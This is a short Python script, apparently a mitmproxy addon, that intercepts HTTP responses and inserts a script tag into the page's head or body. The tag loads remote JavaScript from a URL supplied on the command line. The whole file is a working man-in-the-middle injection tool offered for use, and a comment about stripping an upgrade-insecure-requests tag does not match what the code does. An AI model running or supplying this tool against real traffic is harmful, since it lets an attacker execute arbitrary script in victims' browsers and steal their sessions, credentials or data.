"""
This script injects a javascript payload in the response.
"""
import re
import sys

def response(flow):
    # strip meta tag upgrade-insecure-requests in response body
    re_pattern = re.findall(b'<head.*?>', flow.response.content)

    if not re_pattern:
        re_pattern = re.findall(b'<body.*?>', flow.response.content)

    if re_pattern:
        str_pattern = re_pattern[0]
        injectjs_pattern = bytes('<script type="text/javascript" src="' + sys.argv[1] + '"></script>','utf-8')
        flow.response.content = re.sub(str_pattern, str_pattern + injectjs_pattern, flow.response.content, flags=re.IGNORECASE)

def start():
    if len(sys.argv) != 2:
        raise ValueError('Usage: -s "injectjs.py <url>"')